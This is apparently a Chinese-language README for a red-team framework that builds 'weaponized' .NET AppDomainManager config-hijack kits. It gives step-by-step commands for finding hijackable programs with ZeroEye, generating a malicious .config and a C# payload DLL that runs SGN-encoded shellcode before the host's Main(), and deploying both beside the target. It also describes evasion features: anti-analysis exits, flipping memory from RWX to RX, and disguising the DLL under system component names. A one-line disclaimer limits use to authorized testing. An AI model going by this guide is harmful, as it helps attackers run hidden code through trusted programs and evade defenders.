# .NET AppDomainManager Config Hijack Framework

.NET 白加黑框架，利用 AppDomainManager 注入实现 CLR 级代码执行。配合 [ZeroEye 5.0](https://github.com/ImCoriander/ZeroEye) 快速发现可劫持的 .NET 目标，一键生成武器化套件。

## 功能特性

- **AppDomainManager 注入** — CLR 在 Main() 之前加载 payload，绕过强签名限制
- **进程内 Shellcode 执行** — VirtualAlloc + CreateThread，无需远程注入
- **环境检测** — 自动识别分析工具（dnSpy/ILSpy/x64dbg/Wireshark 等），发现则静默退出
- **内存权限翻转** — 执行后 RWX → RX，降低内存扫描器检出率
- **Config 保留** — 自动保留原始 assemblyBinding，确保宿主程序正常运行
- **命名伪装** — namespace/class 伪装为系统组件名称

## 原理

```
┌─────────────────────────────────────────────────────────────┐
│  .NET AppDomainManager 注入流程                              │
│                                                             │
│  1. 用户运行 Target.exe                                      │
│  2. CLR 读取 Target.exe.config                              │
│  3. CLR 发现 <appDomainManagerAssembly> 配置                 │
│  4. CLR 加载指定的 payload DLL (无需签名)                     │
│  5. CLR 实例化 AssemblyManager 类                            │
│  6. CLR 调用 InitializeNewDomain() ← payload 在此执行        │
│  7. 宿主程序 Main() 正常启动                                  │
└─────────────────────────────────────────────────────────────┘
```

## 快速开始

### 前置条件

- Windows 10/11
- .NET Framework 4.x (csc.exe 编译器)
- Python 3.7+
- **推荐**: [ZeroEye 5.0](https://github.com/ImCoriander/ZeroEye) 用于发现 .NET 劫持目标

### 工作流程

```
┌─────────────────────────────────────────────────────────────┐
│ 1. 使用 ZeroEye 发现可劫持的 .NET 目标                        │
│    ZeroEye.exe -p c:\ -t dotnet                             │
│    → 输出可劫持的 .NET 程序列表                               │
│                                                             │
│ 2. 使用 generate_dotnet.py 生成劫持套件                       │
│    python generate_dotnet.py -t Target.exe                  │
│    → 生成 Target.exe.config + payload.cs                    │
│                                                             │
│ 3. 在 payload.cs 中填入 SGN 编码后的 shellcode               │
│    private static byte[] buf = new byte[] {0xfc,0x48,...};  │
│                                                             │
│ 4. 编译 payload DLL                                         │
│    csc /target:library /out:Microsoft.Configuration.        │
│        Helper.dll payload.cs                                │
│                                                             │
│ 5. 部署                                                     │
│    Target.exe.config → 放到目标程序同目录                     │
│    payload.dll → 放到目标程序同目录                           │
│    运行 Target.exe → shellcode 在 Main() 之前执行            │
└─────────────────────────────────────────────────────────────┘
```

### 命令行用法

```bash
# 基本用法 — 指定目标 .NET 程序名
python generate_dotnet.py -t MyApp.exe

# 保留原始 config 的 assemblyBinding (推荐)
python generate_dotnet.py -t MyApp.exe -c MyApp.exe.config

# 自定义 payload DLL 名称
python generate_dotnet.py -t MyApp.exe -o CustomName

# 交互模式
python generate_dotnet.py
```

## 推荐搭配: ZeroEye 5.0

[ZeroEye](https://github.com/ImCoriander/ZeroEye) 5.0 新增 .NET 程序扫描支持：

- **自动识别 .NET** 通过 PE CLR header 检测，无需手动判断
- **Config 劫持检测** 检测 .exe.config 是否存在（不存在 = 可创建）
- **P/Invoke 分析** 提取 ModuleRef 表，发现额外的 DLL 劫持向量
- **AssemblyRef 分析** 识别可侧加载的第三方程序集

典型用法:
```bash
# 扫描目录寻找可劫持的 .NET 目标
ZeroEye.exe -p c:\ -t dotnet -s -x 64

# 分析单个 .NET 程序
ZeroEye.exe -i Target.exe

# 生成劫持模板 (ZeroEye 的 PoC 版本)
ZeroEye.exe -d Target.exe

# 使用本项目生成武器化版本
python generate_dotnet.py -t Target.exe -c Target.exe.config
```

## 项目结构

```
dll_sgn/ (dotnet branch)
├── generate_dotnet.py   # .NET 劫持套件生成器
├── payload.cs           # 生成产物: 武器化 C# payload
├── Target.exe.config    # 生成产物: AppDomainManager 注入 config
└── README.md            # 本文件
```

## 编译配置

```bash
# 标准编译
csc /target:library /out:Microsoft.Configuration.Helper.dll payload.cs

# 如需引用其他程序集
csc /target:library /out:Microsoft.Configuration.Helper.dll /reference:System.dll payload.cs
```

## 注意事项

- Shellcode 必须经过编码 (推荐 SGN)，否则静态特征明显
- 仅适用于 .NET Framework 4.x 程序（.NET Core/5+ 不支持 AppDomainManager）
- 如果目标已有 .exe.config，使用 `-c` 参数保留原始 assemblyBinding
- payload DLL 名称建议伪装为系统组件（默认: Microsoft.Configuration.Helper）
- 仅用于授权渗透测试和 CTF 竞赛

## 相关技术

- [T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/)
- [AppDomainManager Injection](https://www.rapid7.com/blog/post/2023/07/11/appdomain-manager-injection-new-techniques-for-red-teams/)
- 原生 DLL 代理版本请切换到 `main` 分支
